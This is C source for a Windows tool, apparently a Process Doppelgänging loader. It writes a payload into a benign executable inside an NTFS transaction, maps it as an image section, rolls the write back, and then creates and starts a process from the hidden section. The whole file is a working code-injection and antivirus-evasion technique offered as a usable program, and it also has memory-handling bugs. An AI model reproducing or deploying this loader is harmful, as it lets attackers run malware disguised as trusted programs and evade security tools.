#include "winntos.h"
#include "stdio.h"
#include "ktmw32.h"

#define MAX(a, b) (a > b? a:b)
#define MIN(a, b) (a > b? b:a)

#pragma comment(lib, "ktmw32.lib")
INT wmain(INT argc, WCHAR* argv[]) {

	if (argc < 3) {
		printf("usage: proc_Dopp.exe <whiteModuleFile> <injectModuleFile>\n\n");
		return 1;
	}

	NtCreateSection ntCreateSection = NULL;
	NtCreateProcessEx ntCreateProcessEx = NULL;
	RtlCreateProcessParametersEx rtlCreateProcessParametersEx = NULL;
	NtQueryInformationProcess ntQueryInformationProcess = NULL;
	RtlInitUnicodeString rtlInitUnicodeString = NULL;
	NtCreateThreadEx ntCreateThreadEx = NULL;

	HMODULE ntdll = LoadLibrary(L"ntdll.dll");
	if (ntdll) {
		ntCreateSection = (NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
		if (ntCreateSection)
			printf(" Succeed get funtion NtCreateSection Address : %#llx :)\n", (DWORD)ntCreateSection);
		else {
			printf(" Fail get funtion NtCreateSection Address :(\n");
			return 1;
		}
		ntCreateProcessEx = (NtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
		if (ntCreateProcessEx)
			printf(" Succeed get funtion NtCreateProcessEx Address : %#llx :)\n", (DWORD)ntCreateProcessEx);
		else {
			printf(" Fail get funtion NtCreateProcessEx Address :(\n");
			return 1;
		}
		rtlCreateProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
		if (rtlCreateProcessParametersEx)
			printf(" Succeed get funtion RtlCreateProcessParametersEx Address : %#llx :)\n", 
					(DWORD)rtlCreateProcessParametersEx);
		else {
			printf(" Fail get funtion RtlCreateProcessParametersEx Address :(\n");
			return 1;
		}
		ntQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
		if (ntQueryInformationProcess)
			printf(" Succeed get funtion NtQueryInformationProcess Address : %#llx :)\n",
			(DWORD)ntQueryInformationProcess);
		else {
			printf(" Fail get funtion NtQueryInformationProcess Address :(\n");
			return 1;
		}
		rtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		if (rtlInitUnicodeString)
			printf(" Succeed get funtion RtlInitUnicodeString Address : %#llx :)\n",
			(DWORD)rtlInitUnicodeString);
		else {
			printf(" Fail get funtion RtlInitUnicodeString Address :(\n");
			return 1;
		}
		ntCreateThreadEx = (NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
		if (ntCreateThreadEx)
			printf(" Succeed get funtion NtCreateThreadEx Address : %#llx :)\n",
			(DWORD)ntCreateThreadEx);
		else {
			printf(" Fail get funtion NtCreateThreadEx Address :(\n");
			return 1;
		}
	}
	else {
		printf(" Load ntdll.dll Failed :(\n");
		return 1;
	}

	WCHAR *szSrcFile = (WCHAR*)malloc(wcslen(argv[1]) + 4);
	WCHAR *szInjectFile = (WCHAR*)malloc(wcslen(argv[2]) + 4);
	HANDLE hInjFile = NULL, hTx = NULL, hTransFile = NULL, hSection = NULL, hProcess = NULL, hCurProcess = NULL;
	CHAR *szInjBuff = NULL;

	wcscpy(szSrcFile, argv[1]);
	wcscpy(szInjectFile, argv[2]);

	do {
		hInjFile = CreateFile(szInjectFile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		if (INVALID_HANDLE_VALUE == hInjFile) {
			if (GetLastError() == ERROR_FILE_NOT_FOUND)
				printf(" The File To Be INJECTED NOT FOUND :(\n");
			else
				printf(" OPEN injected file ERROR :(\n");
			break;
		}

		DWORD dwInjFileSize = GetFileSize(hInjFile, 0), dwReadBytes = 0;
		szInjBuff = (CHAR*)malloc(dwInjFileSize);
		if (!ReadFile(hInjFile, szInjBuff, dwInjFileSize, &dwReadBytes, 0)) {
			printf(" read injected file error :(\n");
			break;
		}
		hTx = CreateTransaction(0, 0, 0, 0, 0, 0, 0);
		if (INVALID_HANDLE_VALUE == hTx) {
			printf(" create transaction failed :(\n");
			break;
		}

		hTransFile = CreateFileTransacted(szSrcFile, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0, hTx, 0, 0);
		if (INVALID_HANDLE_VALUE == hTransFile) {
			printf(" append black file transacted failed :(\n");
			break;
		}
		DWORD dwWrittenBytes = 0;
		if (!WriteFile(hTransFile, szInjBuff, dwReadBytes, &dwWrittenBytes, 0) || !dwWrittenBytes) {
			printf(" write target file failed :(\n");
			break;
		}
		printf(" Write To Target File success :)\n");

		hSection = NULL;

		if (ntCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTransFile)) {
			printf(" CreateSeciotn Failed :(  %#x\n", GetLastError());
			break;
		}
		// succeed map file as image
		printf(" CreateSeciotn Success :)\n");

		if (!RollbackTransaction(hTx)) {
			printf(" RollBackFile Failed :(  %#x\n", GetLastError());
			break;
		}
		printf(" RollBackFile Success :)\n");
		hProcess = NULL;
		hCurProcess = GetCurrentProcess();

		if (ntCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, 0, hCurProcess, 4, hSection, 0, 0, 0)) {
			printf(" create process failed :( %#x\n", GetLastError());  // 失败
			break;
		}
		printf(" create process SUCCESS :)\n");

		PROCESS_BASIC_INFORMATION pbi;
		DWORD ReturnLength = 0;
		
		/* 获取注入进程的PEB数据块信息 */
		if (ntQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength)) {
			printf(" query process pbi failed :( %#x\n", GetLastError());
			break;
		}

		SIZE_T size = 0, imgBase = NULL;
		CHAR tmp[0x100] = { 0 };
		ReadProcessMemory(hProcess, pbi.PebBaseAddress, &tmp, 0x100, &size);

		imgBase = (ULONG64)((PPEB)tmp)->ImageBaseAddress;	// PEB获取注入进程基址
		printf(" image base: %#llx\n", imgBase);

		PRTL_USER_PROCESS_PARAMETERS processParams = NULL;
		UNICODE_STRING dstUniStr;

		rtlInitUnicodeString(&dstUniStr, szSrcFile);
		if(rtlCreateProcessParametersEx(&processParams, &dstUniStr, NULL, NULL, &dstUniStr, NULL,
			NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)){
			printf(" Create ProcessParameters failed :( %#x\n", GetLastError());
			break;
		}
		printf(" Create ProcessParameters SUCCESS :)\n");

		HANDLE ThreadID = NULL;
		LPVOID paramBaseAddr = NULL;
		ULONG_PTR start = (ULONG_PTR)MIN(processParams, processParams->Environment);
		ULONG_PTR end = (ULONG_PTR)MAX(processParams, processParams->Environment);
		size = end - start;

		if (!VirtualAllocEx(hProcess, (LPVOID)start, size, 
							MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			printf(" VirtualAllocEx processParams failed :( %#x\n", GetLastError());
			break;
		}
		if (!WriteProcessMemory(hProcess, (LPVOID)start, processParams, size, &size)) {
			printf(" Write USER PROCESS PARAMETERS failed :( %#x\n", GetLastError());
			break;
		}
		
		if (!WriteProcessMemory(hProcess, &(pbi.PebBaseAddress->ProcessParameters), &processParams, sizeof(PVOID), &size)) {
			printf(" Write USER PROCESS PARAMETERS Address failed :( %#x\n", GetLastError());
			break;
		}
		
		PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(szInjBuff + ((PIMAGE_DOS_HEADER)szInjBuff)->e_lfanew);
		LPTHREAD_START_ROUTINE entry = (LPTHREAD_START_ROUTINE)(imgBase + (pNtHeader->OptionalHeader.AddressOfEntryPoint));
		printf(" entry point: %#llx\n", entry);

		if (ntCreateThreadEx(&ThreadID, THREAD_ALL_ACCESS, NULL, hProcess,
			(LPTHREAD_START_ROUTINE)entry,
			NULL, FALSE, 0, 0, 0, NULL)) {
				printf(" Create Thread failed :( %#x\n", GetLastError());
				break;
		}
		printf(" Create Thread Success :)\n");
		/*if (!CreateRemoteThread(hProcess, NULL, NULL,
			(LPTHREAD_START_ROUTINE)(pNtHeader->OptionalHeader.AddressOfEntryPoint + imgBase),
			NULL, NULL, &ThreadID)) {
			printf(" Create Thread failed :( %#x\n", GetLastError());
			break;
		}
		printf(" remote thread id: %#x\n", ThreadID);*/

	} while (0);
	
	VirtualFree(szInjectFile, 0, MEM_RELEASE);
	VirtualFree(szSrcFile, 0, MEM_RELEASE);
	VirtualFree(szInjBuff, 0, MEM_RELEASE);

	if (hTransFile)
		CloseHandle(hTransFile);
	if (hTx)
		CloseHandle(hTx);
	if (hInjFile)
		CloseHandle(hInjFile);
	if (hCurProcess)
		CloseHandle(hCurProcess);
	if (hSection)
		CloseHandle(hSection);
	if (hProcess)
		CloseHandle(hProcess);
	return 0;
}
